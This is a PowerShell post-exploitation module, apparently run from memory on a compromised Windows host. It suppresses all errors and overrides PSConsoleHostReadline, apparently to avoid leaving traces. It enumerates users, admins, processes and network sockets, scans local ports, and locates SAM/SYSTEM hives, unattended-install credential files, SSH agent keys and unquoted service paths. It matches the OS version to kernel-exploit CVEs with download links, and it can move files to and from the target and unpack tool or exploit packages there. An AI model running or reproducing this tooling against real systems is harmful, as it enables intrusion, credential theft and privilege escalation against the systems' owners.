$InformationPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$DebugPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OuputEncoding = [Text.UTF8Encoding]::UTF8

$global:PSV = ([int]$PsVersionTable.PsVersion.Major) 
$global:BUFFER = ""
$global:CACHE_SYSTEM = ""
$global:CACHE_USERS = ""
$global:CACHE_PROCESS = ""
$global:CACHE_NETWORK = ""
$global:CACHE_PE = ""
$global:CACHE_CVE = ""
$global:PULL = "WwBQAFUATABMAF0A"
$global:ERR = "Post: Command failed."
$global:HELP = @"
post set  bsd|linux|windows                      set post on remote system memory
     show system|users|process|network|pe|cve    show information
     push FILE FILE                              copy local FILE to remote FILE (windows <= 4MB)
     pull FILE FILE                              copy remote FILE to local FILE
     put  tools DIR                              install static binaries package on DIR
          exploits DIR                           install exploit sources package on DIR
     help                                        show help`n
"@

$global:PORTS = "21",
"22",
"23",
"25",
"53",
"80",
"110",
"143",
"443",
"993",
"995",
"8080"

$global:LISTS = "\repair\SAM",
"\repair\system",
"\System32\config\SAM",
"\System32\config\SYSTEM",
"\System32\config\RegBack\SAM",
"\System32\config\RegBack\SYSTEM" 

$global:EVERYONE = "C:\Program Files\*",
"C:\Program Files (x86)\*"

$global:CREDENTIALS = "\Panther\Unattended.xml",
"\panther\setupinfo",
"\system32\sysprep\Unattended.xml",
"\system32\sysprep.inf" 

$global:EXPLOITS = "2014-4113|8:*:*-8.1:*:*|x86_64|exploit-db.com/exploits/37064||",
"2015-2517|8:*:*-8.1:*:*-10:*:*-server2012:*:*-server2012r2:*:*||github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-097||",
"2016-0099|8.1:*:*-10:1511:*-server2012:*:*-server2012r2:*:*||exploit-db.com/exploits/39719||",
"2016-3309|8.1:*:*|x86_64|github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098||",
"2016-3371|8.1:*:*-10:10586:*||exploit-db.com/exploits/40429||",
"2017-0213|8.1:*:*-10:1511:*-10:1607:*-10:1703:*-server2012:*:*-server2012r2:*:*-server2016:*:*||exploit-db.com/exploits/42020||",
"2018-0743|10:1703:*-10:1709:*-server2016:1709:*||exploit-db.com/exploits/43962||"

function PSConsoleHostReadline {}

function append()
{
    if ($args[1] -eq "" -or $args[1] -eq $null) {
        $global:BUFFER = $global:BUFFER + "`n" + $args[0] + "`n"
    } else {
        $FIRST = $true
        foreach ($LINE in $($args[1] -split "`r`n")) {
            if ($args[0] -eq "NULL") {
               $global:BUFFER = $global:BUFFER + $(" " * 4) + $LINE + "`n"
            } else {
                if ($FIRST) {
                    $global:BUFFER = $global:BUFFER + $(" " * 4) + $args[0] + " " + $("." * (16 - $args[0].length)) + " " + $LINE + "`n"
                } else {
                    $global:BUFFER = $global:BUFFER + $(" " * 22) + $LINE + "`n"
                }
                $FIRST = $false
            }
        }
    }
}

function print()
{
    Write-Output $args[0]
}

function success()
{
    if ($args[0] -eq "" -or $args[0] -eq $null -or $args[1] -ne "True") {
        return $false
    }

    return $true
}

function show_system() 
{
    if ($global:CACHE_SYSTEM -eq "") {
        append "HOST"
            
        $RET = ((Get-CimInstance Win32_OperatingSystem).CSName)
        if (success $RET $?) {
            append "NAME" $RET
        } else {
            append "NAME" "N/A"
        }
        $RET = ((Get-CimInstance Win32_OperatingSystem).Caption)
        if (success $RET $?) {
            append "OS" $RET
        } else {
            append "OS" "N/A"
        }
        $RET = ((Get-CimInstance Win32_OperatingSystem).BuildNumber)
        if (success $RET $?) {
            append "BUILD" $RET
        } else {
            append "BUILD" "N/A"
        }
        $RET = ((Get-CimInstance Win32_OperatingSystem).ServicePackMajorVersion).ToString()
        if (success $RET $?) {
            append "SP" $RET
        } else {
            append "SP" "N/A"
        }
        $RET = ((Get-CimInstance Win32_OperatingSystem).Version)
        if (success $RET $?) {
            append "KERNEL" $RET
        } else {
            append "KERNEL" "N/A"
        }
        $RET = ((Get-CimInstance Win32_OperatingSystem).OSArchitecture)
        if (success $RET $?) {
            if ($RET -eq "32-bit") {
                append "ARCH" "x86"
            } else {
                append "ARCH" "x86_64"
            }
        } else {
            append "ARCH" "N/A"
        }
        $RET = ((Get-CimInstance Win32_BaseBoard).Product)
        if (success $RET $?) {
            if ($RET -like "*virtualbox*") {
                append "VBOX" "Yes"
            } else {
                append "VBOX" "No"
            }
        } else {
            append "VBOX" "N/A"
        }
        $RET = (Get-CimInstance Win32_Service | Where-Object Name -eq cexecsvc | Format-Table -Hidetableheaders -Property Name | Out-String)
        if (success $RET $?) {
            append "DOCKER" "Yes"
        } else {
            append "DOCKER" "No"
        }
        $RET = ((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime)
        if (success $RET $?) {
            append "UPTIME" $RET
        } else {
            append "UPTIME" "N/A"
        }
    
        append "STORAGE"
    
        $RET = (Get-CimInstance Win32_LogicalDisk | Out-String | ForEach-Object {$_.Trim()})
        if (success $RET $?) {
            append "NULL" $RET
        } else {
            append "NULL" "N/A"
        }
        
        append "DEV"

        $RET = (((gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*").DisplayName -Match "Microsoft Visual C").Length -gt 0)
        if ($RET -eq "True") {
            append "MSVC" "Yes"
        } else {
            append "MSVC" "No"
        }
        $RET = (((gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*").DisplayName -Match "MinGW").Length -gt 0)
        if ($RET -eq "True") {
            append "MINGW" "Yes"
        } else {
            append "MINGW" "No"
        }
        $RET = (((gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*").DisplayName -Match "Python").Length -gt 0)
        if ($RET -eq "True") {
            append "PYTHON" "Yes"
        } else {
            append "PYTHON" "No"
        }
        $RET = (((gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*").DisplayName -Match "Perl").Length -gt 0)
        if ($RET -eq "True") {
            append "PERL" "Yes"
        } else {
            append "PERL" "No"
        }
        $RET = (((gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*").DisplayName -Match "Ruby").Length -gt 0)
        if ($RET -eq "True") {
            append "RUBY" "Yes"
        } else {
            append "RUBY" "No"
        }

        append "TOOLS"
        $RET = (((gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*").DisplayName -Match "Git").Length -gt 0)
        if ($RET -eq "True") {
            append "GIT" "Yes"
        } else {
            append "GIT" "No"
        }
        $RET = (((gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*").DisplayName -Match "SSH").Length -gt 0)
        if ($RET -eq "True") {
            append "SSH" "Yes"
        } else {
            append "SSH" "No"
        }
        $RET = (((gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*").DisplayName -Match "Netcat").Length -gt 0)
        if ($RET -eq "True") {
            append "NETCAT" "Yes"
        } else {
            append "NETCAT" "No"
        }
        $RET = (((gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*").DisplayName -Match "Nmap").Length -gt 0)
        if ($RET -eq "True") {
            append "NMAP" "Yes"
        } else {
            append "NMAP" "No"
        }

        $global:CACHE_SYSTEM = $global:BUFFER

        print $global:BUFFER
    } else {
        print $global:CACHE_SYSTEM
    }
}

function show_users() 
{
    if ($global:CACHE_USERS -eq "") {
        append "EFFECTIVE"
            
        $RET = ($Env:UserName)
        if (success $RET $?) {
            append "NAME" $RET
        } else {
            append "NAME" "N/A"
        }
        $RET = ((Get-CimInstance Win32_UserAccount -Filter "Name='$Env:UserName'").SID)
        if (success $RET $?) {
            append "SID" $RET
        } else {
            append "SID" "N/A"
        }
        $RET = (net user $Env:UserName | Select-String "Local Group Memberships")
        if (success $RET $?) {
            $RET = ($RET -replace 'Local Group Memberships', '' -replace '(^\s+|\s+$)', '' -replace '\s+', ' ' -replace '\*', '')
            append "GROUP" $RET
        } else {
            append "GROUP" "N/A"
        }
        $RET = ((Get-CimInstance Win32_UserAccount -Filter "Name='$Env:UserName'").PasswordRequired)
        if ((success $RET $?) -and ($RET -eq "True")) {
            append "PASSWORD" "Yes"
        } else {
            append "PASSWORD" "No"
        }
        $RET = ($Env:HomePath)
        if (success $RET $?) {
            append "HOME" $RET
        } else {
            append "HOME" "N/A"
        }
        $RET = ($Env:Path)
        if (success $RET $?) {
            append "PATH" $RET
        } else {
            append "PATH" "N/A"
        }
        $RET = (Get-ChildItem -Path Env:* | Sort-Object Name | Format-Table -Hidetableheaders -Wrap | Out-String | ForEach-Object {$_.Trim()})
        if (success $RET $?) {
            append "ENV" $RET
        } else {
            append "ENV" "N/A"
        }

        append "NORMAL"

        $RET = (Get-CimInstance Win32_UserAccount -Filter "AccountType=512").Name
        if (success $RET $?) {
            append "NAME" $RET
        } else {
            append "NAME" "N/A"
        }

        append "ADMIN"
      
        $CN = ($Env:ComputerName.toupper())
        $RET=(Get-CimInstance Win32_GroupUser -Filter "GroupComponent=""Win32_Group.Domain='$CN',Name='administrators'""" | % {$_.PartComponent} | Select Name | Format-Table -Hidetableheaders -Wrap | Out-String | ForEach-Object {$_.Trim()})
        if (success $RET $?) {
            append "NAME" $RET
        } else {
            append "NAME" "N/A"
        }

        append "LOGGED-ON"
            
        $RET = ((Get-CimInstance Win32_LoggedOnUser).Antecedent.Name | Select-Object -Unique | Out-String | ForEach-Object {$_.Trim()})
        if (success $RET $?) {
            append "NAME" $RET
        } else {
            append "NAME" "N/A"
        }
        
        $global:CACHE_USERS = $global:BUFFER

        print $global:BUFFER
    } else {
        print $global:CACHE_USERS
    }
}

function show_process() 
{
    if ($global:CACHE_PROCESS -eq "") {
        append "ALL"
            
        $RET = (Get-CimInstance Win32_Process | Format-Table -Property ProcessId, Name | Out-String | ForEach-Object {$_.Trim()})
        if (success $RET $?) {
            append "NULL" $RET
        } else {
            append "NULL" "N/A"
        }

        append "SERVICES"

        $RET = (Get-CimInstance Win32_Service | Where-Object State -eq Running | Format-Table -Property Name, State, Status | Out-String | ForEach-Object {$_.Trim()})
        if (success $RET $?) {
            append "NULL" $RET
        } else {
            append "NULL" "N/A"
        }
        
        $global:CACHE_PROCESS = $global:BUFFER

        print $global:BUFFER
    } else {
        print $global:CACHE_PROCESS
    }
}

function show_network() 
{
    if ($global:CACHE_NETWORK -eq "") {
        append "PUBLIC"
            
        $RET = ((Invoke-WebRequest -UseBasicParsing -Uri "https://ipinfo.io/json").Content)
        if (success $RET $?) {
            append "IP" ($RET | ConvertFrom-Json | Format-Table -Hidetableheaders -Property ip | Out-String | ForEach-Object {$_.Trim()})
            append "CITY" ($RET | ConvertFrom-Json | Format-Table -Hidetableheaders -Property city | Out-String | ForEach-Object {$_.Trim()})
            append "REGION" ($RET | ConvertFrom-Json | Format-Table -Hidetableheaders -Property region | Out-String | ForEach-Object {$_.Trim()})
            append "COUNTRY" ($RET | ConvertFrom-Json | Format-Table -Hidetableheaders -Property country | Out-String | ForEach-Object {$_.Trim()})
        } else {
            append "IP" "N/A"
            append "CITY" "N/A"
            append "REGION" "N/A"
            append "COUNTRY" "N/A"
        }

        append "LOCAL"
        
        $RET = ((Get-NetIPAddress -PrefixOrigin Dhcp).IPAddress)
        if (success $RET $?) {
            append "IP" $RET
        } else {
            append "IP" "N/A"
        }
        if (success $RET $?) {
            $IP = $RET
            $RET = ""
            foreach ($PORT in $global:PORTS) {
                $SOCKET = (New-Object Net.Sockets.TcpClient)
                $ErrorActionPreference = "SilentlyContinue"
                $SOCKET.Connect((Get-NetIPAddress -PrefixOrigin Dhcp).IPAddress, $PORT)
                $ErrorActionPreference = "Continue"
                if ($SOCKET.Connected) {
                    $RET = $RET + $IP + ":" + $PORT + " (open)`n"
                    $SOCKET.Close()
                }
                $SOCKET.Dispose()
                $SOCKET = $null
            }
            $ErrorActionPreference = "SilentlyContinue"
            if (success $RET $?) {
                append "PORTS" $RET
            } else {
                append "PORTS" "*:* (closed)"
            }
        } else {
            append "PORTS" "N/A"
        }
        $RET = ((Get-NetIPConfiguration).IPv4DefaultGateWay | Format-Table -Hidetableheaders -Property NextHop | Out-String | ForEach-Object {$_.Trim()})
        if (success $RET $?) {
            append "GATEWAY" $RET
        } else {
            append "GATEWAY" "N/A"
        }
        $RET = (((Get-NetIPConfiguration).DNSServer | Where-Object ServerAddresses -ne "{}" | Format-Table -Hidetableheaders -Property ServerAddresses | Out-String | ForEach-Object {$_.Trim()}) -replace "[{}]")
        if (success $RET $?) {
            append "DNS" $RET
        } else {
            append "DNS" "N/A"
        }
        
        append "SOCKETS"

        $RET = (Get-NetTCPConnection | Format-Table -Property LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Out-String | ForEach-Object {$_.Trim()})
        if (success $RET $?) {
            append "TCP" $RET
        } else {
            append "TCP" "N/A"
        }
        $RET = (Get-NetUDPEndpoint | Format-Table -Property LocalAddress, LocalPort | Out-String | ForEach-Object {$_.Trim()})
        if (success $RET $?) {
            append "UDP" $RET
        } else {
            append "UDP" "N/A"
        }

        $global:CACHE_NETWORK = $global:BUFFER

        print $global:BUFFER
    } else {
        print $global:CACHE_NETWORK
    }
}

function show_pe() 
{
    if ($global:CACHE_PE -eq "") {
        append "FILES"

        foreach ($DIR in $global:LISTS) {
            $RET = (Test-Path $Env:WINDIR$DIR)
            if (success $RET $?) {
                $TEMP = $TEMP + "$Env:WINDIR$DIR" + ": Yes`r`n" 
            } else {
                $TEMP = $TEMP + "$Env:WINDIR$DIR" + ": No`r`n"
            }
        }
        append "LIST" $TEMP
        $TEMP = ""
        foreach ($DIR in $global:EVERYONE) {
            $RET = (Get-ChildItem $DIR | % {try{Get-Acl $_ -EA | Where {($_.Access | Select -ExpandProperty IdentityReference) -match "Everyone"}} catch {}} | Format-Table -Hidetableheaders -Property Path | Out-String)
            if (success $RET $?) {
                $TEMP = $TEMP + $RET 
            } else {
                $TEMP = $TEMP + $DIR + ": No`r`n"
            }
        }
        append "EVERYONE" $TEMP.Trim()
        
        append "PROGRAMS"

        $RET = (Test-Path "Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer")
        if (success $RET $?) {
            append "ELEVATED" "Yes"
        } else {
            append "ELEVATED" "No"
        }

        append "SERVICES"

        $RET = (Get-CimInstance Win32_StartupCommand | Select Command, User | Out-String | ForEach-Object {$_.Trim()})
        if (success $RET $?) {
            append "STARTUP" $RET
        } else {
            append "STARTUP" "N/A"
        }
        $RET = (Get-CimInstance Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | Select PathName, DisplayName, Name | Out-String | ForEach-Object {$_.Trim()})
        if (success $RET $?) {
            append "UNQUOTED" $RET
        } else {
            append "UNQUOTED" "No"
        }

        append "SSH"

        $RET = (reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys)
        if (success $RET $?) {
            append "KEYS" $RET
        } else {
            append "KEYS" "No"
        }

        append "CREDENTIALS"

        $TEMP=""
        foreach ($FILE in $global:CREDENTIALS) {
            $RET = (Test-Path $Env:WINDIR$FILE)
            if (success $RET $?) {
                $TEMP = $TEMP + "$Env:WINDIR$FILE" + ": Yes`r`n" 
            } else {
                $TEMP = $TEMP + "$Env:WINDIR$FILE" + ": No`r`n"
            }
        }
        append "NULL" $TEMP.Trim()
        
        $global:CACHE_PE = $global:BUFFER

        print $global:BUFFER
    } else {
        print $global:CACHE_PE
    }
}

function show_cve() 
{
    if ($global:CACHE_CVE -eq "") {
        $CONTINUE = $true
        $RET = ((Get-CimInstance Win32_OperatingSystem).Caption)
        if (success $RET $?) {
            if ($RET -like "*Windows 8*") {
                $CAPTION = "8"
            } elseif ($RET -like "*Windows 8.1*") {
                $CAPTION = "8.1"
            } elseif ($RET -like "*Windows 10*") {
                $CAPTION = "10"
            } elseif ($RET -like "*Windows Server 2012*") {
                $CAPTION = "server2012"
            } elseif ($RET -like "*Windows Server 2012 R2*") {
                $CAPTION = "server2012r2"
            } elseif ($RET -like "*Windows Server 2016*") {
                $CAPTION = "server2016"
            } elseif ($RET -like "*Windows Server 2019*") {
                $CAPTION = "server2019"
            } else {
                $CONTINUE = $false
            }
        } else {
            $CONTINUE = $false
        }
        if ($CONTINUE) {
            $RET = ((Get-CimInstance Win32_OperatingSystem).BuildNumber)
            if ($RET -ne $null -and $? -eq "True") {
                if ($RET -eq "") {
                    $BUILD = "*"
                } else {
                    $BUILD = $RET
                }
            } else {
                $CONTINUE = $false
            }
        }
        if ($CONTINUE) {
            $RET = ((Get-CimInstance Win32_OperatingSystem).ServicePackMajorVersion)
            if ($RET -ne $null -and $? -eq "True") {
                if ($RET -eq "") {
                    $SP = "*"
                } else {
                    $SP = $RET
                }
            } else {
                $CONTINUE = $false
            }
        }
        if ($CONTINUE) {
            $RET = ((Get-CimInstance Win32_OperatingSystem).OSArchitecture)
            if (success $RET $?) {
                if ($RET -eq "32-bit") {
                    $ARCH = "x86"
                } else {
                    $ARCH = "x86_64"
                }
            }
        }

        if ($CONTINUE) {
            append "CVE"

            $MATCH = $false
            foreach ($EXPLOIT in $global:EXPLOITS) {
                $I = 0
                $VULNERABLE = $false
                foreach ($DATA in $EXPLOIT.Split("|")) {
                    if ($I -eq 0) {
                        $CVE = $DATA
                    } elseif ($I -eq 1) {
                        foreach ($VERSION in $DATA.Split("-")) {
                            $II = 0
                            foreach ($V in $VERSION.Split(":")) {
                                if ($II -eq 0) {
                                    if ($V -ne $CAPTION) {
                                        break
                                    }
                                } elseif ($II -eq 1) {
                                    if ($V -ne "*") {
                                        if ($V -ne $BUILD) {
                                            break
                                        }
                                    }
                                } else {
                                    if ($V -ne "*") {
                                        if ($V -eq $SP) {
                                            $VERSIONS = $DATA
                                            $VULNERABLE = $true
                                        }
                                    } else {
                                        $VERSIONS = $DATA
                                        $VULNERABLE = $true
                                    }
                                }
                                $II = $II + 1
                            }
                            if ($VULNERABLE) {
                                break
                            }
                        }
                        if ($VULNERABLE -eq $false) {
                            break
                        }
                    } elseif ($I -eq 2) {
                        if (($ARCH -ne "" -and $ARCH -ne $null) -and ($DATA -ne "" -and $DATA -ne $null)) {
                            if ($ARCH -ne $DATA) {
                                $VULNERABLE = $false
                                break
                            }
                        }
                    } elseif ($I -eq 3) {
                        if ($DATA -ne "" -and $DATA -ne $null) {
                            $URL = $DATA
                        }
                    } elseif ($I -eq 4) {
                        if ($DATA -ne "" -and $DATA -ne $null) {
                            $NOTE = $DATA + "`n"
                        } else {
                            $NOTE = ""
                            $URL = $URL + "`n"
                        }
                    }
                    $I = $I + 1
                }

                if ($VULNERABLE) {
                    append "CVE" $CVE
                    append "KERNEL" $VERSIONS
                    append "EXPLOIT" $URL
                    if ($NOTE -ne "" -and $NOTE -ne $null) {
                        append "NOTE" $NOTE
                    }
                    $MATCH = $true
                }
            }
        }

        if ($MATCH) {
            $global:CACHE_CVE = $global:BUFFER
            print $global:BUFFER
        } else {
            print "`n"
        }
    } else {
        print $global:CACHE_CVE
    }
}

function push()
{
    $FILE = $args[1]
    [byte[]]$BYTES = [System.Convert]::FromBase64String($args[0])

    [System.IO.File]::WriteAllBytes($FILE, $BYTES)

    if ($? -eq "True") {
        print $global:EOF
    } else {
        print $global:EOF
        sleep 1
        print $global:ERR
    }
}

function pull()
{
    [byte[]]$BYTES = [System.IO.File]::ReadAllBytes($args[0])

    if ($? -eq "True") {
        $BUF = [System.Convert]::ToBase64String($BYTES);
        $RET = $args[1] + "`n" + $BUF + "`n" + [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($global:PULL)) + $global:EOF
        print $RET
    } else {
        print $global:EOF
        sleep 1
        print $global:ERR
    }
}

function put()
{
    $FILE = $args[1] + "\file.zip" 
    [byte[]]$BYTES = [System.Convert]::FromBase64String($args[0])

    [System.IO.File]::WriteAllBytes($FILE, $BYTES)

    if ($? -eq "True") {
        $SHELL = (New-Object -com shell.application)
        $ITEM = (Get-Item $FILE)
        $DIR = ($SHELL.namespace($args[1]))
        $DIRZIP = ($SHELL.namespace($ITEM.fullname))
        $DIR.Copyhere($DIRZIP.items())
        $RET = $?
        (Remove-Item $FILE)
    }

    if ($RET -eq "True") {
        print $global:EOF
    } else {
        print $global:EOF
        sleep 1
        print $global:ERR
    }
}

function post()
{
    $global:BUFFER = ""

    if ($global:PSV -ne "" -and $global:PSV -ne $null -and $global:PSV -gt 2) { 
        if ($args[0] -eq "show") {
            if ($args[1] -eq "system") {
                show_system
            } elseif ($args[1] -eq "users") {
                show_users
            } elseif ($args[1] -eq "process") {
                show_process
            } elseif ($args[1] -eq "network") {
                show_network
            } elseif ($args[1] -eq "pe") {
                show_pe
            } elseif ($args[1] -eq "cve") {
                show_cve
            } else {
                print $global:HELP
            }
        } elseif ($args[0] -eq "push") {
            push $args[1] $args[2]
        } elseif ($args[0] -eq "pull") {
            pull $args[1] $args[2]
        } elseif ($args[0] -eq "put") {
            put $args[1] $args[2]
        } else {
            print $global:HELP
        }
    } else {
        print "Post: Powershell version is not compatible."
    }
}

$global:EOF = "[PEOF]"
